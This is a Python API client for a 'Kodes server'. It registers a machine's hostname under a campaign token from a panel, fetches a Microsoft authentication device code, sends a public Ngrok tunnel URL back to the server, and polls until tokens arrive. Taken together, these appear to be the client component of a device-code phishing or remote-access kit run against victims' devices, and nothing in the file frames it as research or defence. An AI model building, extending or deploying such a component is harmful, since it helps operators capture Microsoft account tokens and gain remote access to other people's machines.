"""
API client for communication with the Kodes server.
"""
import socket
import requests
import logging
import time
from urllib.parse import quote_plus

logger = logging.getLogger(__name__)


class ApiClient:
    """
    Client for interacting with the Kodes server API.
    """
    
    def __init__(self, api_url, campaign_token=None):
        """
        Initialize the API client.

        Args:
            api_url: Base URL for the Kodes API server
            campaign_token: Optional campaign token (from the panel's client.json
                download) — links the device to a campaign
        """
        self.api_url = api_url
        self.hostname = socket.gethostname()
        self.campaign_token = (campaign_token or '').strip() or None
        self.session = requests.Session()
        self.session.timeout = (5, 30)

    def _device_url(self, extra=''):
        """
        Build the device endpoint URL: hostname + optional campaign token
        (?c=) + any extra query parameters.
        """
        url = f"{self.api_url}/?h={quote_plus(self.hostname)}"
        if self.campaign_token:
            url += f"&c={quote_plus(self.campaign_token)}"
        if extra:
            url += f"&{extra}"
        return url

    def register_device(self):
        """
        Register this device with the server and get a device code.

        Returns:
            str: The device code for Microsoft authentication
        """
        url = self._device_url()
        
        try:
            response = self.session.get(url)
            response.raise_for_status()
            code = response.text.strip()
            logger.info(f"Device registered successfully, received code")
            return code
        except requests.RequestException as e:
            logger.error(f"Failed to register device: {e}")
            raise
    
    def send_ngrok_url(self, ngrok_url):
        """
        Send the Ngrok URL to the server.
        
        Args:
            ngrok_url: The public Ngrok URL
            
        Returns:
            bool: True if successful, False otherwise
        """
        url = self._device_url(f"url={quote_plus(ngrok_url)}")
        
        try:
            response = self.session.get(url)
            response.raise_for_status()
            logger.info(f"Ngrok URL sent successfully: {ngrok_url}")
            return True
        except requests.RequestException as e:
            logger.error(f"Failed to send Ngrok URL: {e}")
            return False
    
    def check_server_status(self):
        """
        Check server status and whether tokens are available.
        
        Returns:
            bool: True if authentication is complete, False otherwise
        """
        url = self._device_url()

        try:
            response = self.session.get(url)
            response.raise_for_status()

            status = response.text.strip()
            if status == "OK":
                logger.debug("Server check: Authentication complete")
                return True
            else:
                logger.debug("Server check: Authentication pending")
                return False
                
        except requests.RequestException as e:
            logger.warning(f"Server status check failed: {e}")
            return False
    
    def perform_health_check(self, interval=30, max_retries=3):
        """
        Perform periodic health checks to the server.
        
        Args:
            interval: Time in seconds between checks
            max_retries: Maximum number of consecutive failed checks before returning
            
        Returns:
            bool: True if checks were successful, False if max_retries was reached
        """
        consecutive_failures = 0
        
        try:
            while consecutive_failures < max_retries:
                if self.check_server_status():
                    consecutive_failures = 0
                else:
                    consecutive_failures += 1
                    
                time.sleep(interval)
                
            return False
        except KeyboardInterrupt:
            logger.info("Health check interrupted by user")
            return True